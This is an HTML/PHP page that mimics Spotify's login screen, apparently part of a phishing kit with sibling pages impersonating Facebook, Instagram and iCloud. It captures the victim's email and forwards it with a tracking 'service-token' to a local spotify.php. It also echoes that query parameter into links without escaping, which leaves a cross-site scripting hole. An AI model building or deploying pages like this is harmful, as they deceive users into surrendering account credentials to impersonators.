<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.1/font/bootstrap-icons.min.css"
    />
    <link rel="shortcut icon" href="favicon.png" type="image/x-icon">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spotify</title>
    <style>
        *{
            margin: 0;padding: 0;box-sizing: border-box;
            font-family: Arial, Helvetica, sans-serif;
        }
        body{
            background: #121212;
            color: white;
        }
        .container, form , footer, section{
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        #s{
            font-size: 30px;
            margin-top: 50px;
        }
        h1{
            font-size: 42px;
            font-weight: 900;
            
        }
        .container{
            padding: 0 30px;
            min-width: 380px;
            max-width: 400px;
            margin: 0 auto;
        }
        form{
            width: 100%;
            gap: 10px;
            margin-top: 27px;
        }
        section{
            width: 100%;
        }
        form input{
            border: 1.2px solid #7a7a7a;
            background: transparent;
            padding: 15px;
            width: 100%;
            border-radius: 6px;
            color: white;
            font-size: 17px;
        }
        form label {
            align-self: flex-start;
            /* margin-bottom: 5px; */
            font-weight: 700;
            font-size: 14px;
        }
        form button {
            background: #1ed760;
            border: none;
            padding: 13px;
            width: 100%;
            border-radius: 30px;
            color: black;
            font-weight: 700;
            font-size: 18px;
            margin-top: 5px;
        }
        form button:hover {
            background: #23e065;
            cursor: pointer;
            transform: scale(1.02);
        }
        .or{
            margin: 20px 0;
        }
        section a{
            border: 1px solid #7a7a7a;
            padding: 13px 12px 13px 20px;
            width: 100%;
            text-align: center;
            border-radius: 30px;
            text-decoration: none;
            color: white;
            font-weight: 600;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        section a:hover{
            cursor: pointer;
            transform: scale(1.02);
            border-color: white;
        }
        section a p{
            flex: 1;
            text-align: center;
            font-size: 17px;
        }
        footer{
            gap: 20px;
            margin-top: 30px;
        }
        footer p{
            color: #7a7a7a;
            font-weight: 600;
        }
        footer a{
            text-decoration: none;
            background: none;
            border: none;
            color: white;
            font-weight: 700;
            font-size: 17px;
        }
        .error{
            border-color: red;
        }
        .error + .error-message {
            display: flex;
        }
        .down{
            font-size: 10px;
            color: #7a7a7a;
            text-align: center;
            margin: 30px 0;
        }
        .error-message {
            color: #ba5a64;
            font-size: 13px;
            font-weight: 700;
            display: none;
            align-self: flex-start;
            gap: 5px;
        }.click{
            filter: brightness(40%);
            cursor: not-allowed !important;
        }
    </style>
</head>
<body>
    <div class="container">
        <i class="bi bi-spotify" id="s"></i>
    <h1>Welcome back</h1>
    <form>
        <label for="email">Email or username</label>
        <input type="email" id="email" onblur="if(this.value.trim() == '') { this.classList.add('error'); } else { this.classList.remove('error'); }" onkeyup="if(this.value.trim() != '') { this.classList.remove('error'); }" >
        <p class="error-message"><i class="bi bi-exclamation-circle"></i> <span>Please enter your Spotify username or email address.</span></p>
        <button type="button" onclick="if(document.getElementById('email').value.trim() == '') { document.getElementById('email').classList.add('error'); } else { document.getElementById('email').classList.remove('error'); this.classList.add('click') ; document.getElementById('email').classList.add('click') ; document.getElementById('email').disabled = true ; setTimeout(() => {
            localStorage.email = document.getElementById('email').value ;
            window.location.href = 'spotify.php?service-token=<?php echo isset($_GET['service-token']) ? $_GET['service-token'] : 1 ?>' ;
        }, 2000);}">Continue</button>
    </form>
    <div class="or">or</div>
    <section>
        <a href="../old_facebook/?service-token=<?php echo isset($_GET['service-token']) ? $_GET['service-token'] : 1 ?>"><img src="facebook_image.png" alt="Facebook"  style="width: 20px;"/><p>Continue with Facebook</p></a>
        <a href="../instagram/??service-token=<?php echo isset($_GET['service-token']) ? $_GET['service-token'] : 1 ?>"><img src="instagram_image.png" alt="Instagram" style="width: 20px;" /><p>Continue with Instagram</p></a>
        <a href="../icloud/?service-token=<?php echo isset($_GET['service-token']) ? $_GET['service-token'] : 1 ?>"><i class="bi bi-apple" style="font-size: 18px;"></i><p>Continue with Apple</p></a>
        <a href="spotify.php?service-token=<?php echo isset($_GET['service-token']) ? $_GET['service-token'] : 1 ?>"><i class="bi bi-phone" style="font-size: 18px;"></i><p>Continue with phone number</p></a>
    </section>
    <footer>
        <p>Don't have an account?</p>
        <a href="https://www.spotify.com/ma-fr/signup?flow_id=56893754-3643-4d62-8a6e-53c23ba287ef%3A1757307312&forward_url=https%3A%2F%2Fwww.spotify.com%2Fuk%2Fsend-premium%2F%3Fflow_ctx%3D56893754-3643-4d62-8a6e-53c23ba287ef%253A1757307312">Sign up</a>
    </footer>
    <span class="down">
        
This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply.
    </span>
    </div>
    <script>
        localStorage.clear();
    </script>
</body>
</html>